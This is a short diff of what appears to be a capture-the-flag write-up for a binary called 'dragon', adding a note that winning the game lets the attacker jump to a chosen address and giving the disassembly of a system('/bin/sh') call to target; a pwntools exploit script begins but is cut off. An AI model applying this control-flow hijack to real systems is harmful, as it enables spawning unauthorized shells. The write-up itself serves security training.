@@ -2,6 +2,14 @@ Optimal way to win the game is this sequence of moves:
 ```python
 optimal = [1,1,1,1,3,3,2,3,3,2,3,3,2,3,3,2]
 ```
+
+After we win, we will be able to jump to the address we want.
+In the binary, we find:
+```
+0x08048DBF    C704245C9304   mov dword [esp], str._bin_sh
+0x08048DC6    E865F7FFFF     call sym.imp.system
+```
+
 ```python
 from pwn import *
 elf = ELF("dragon")
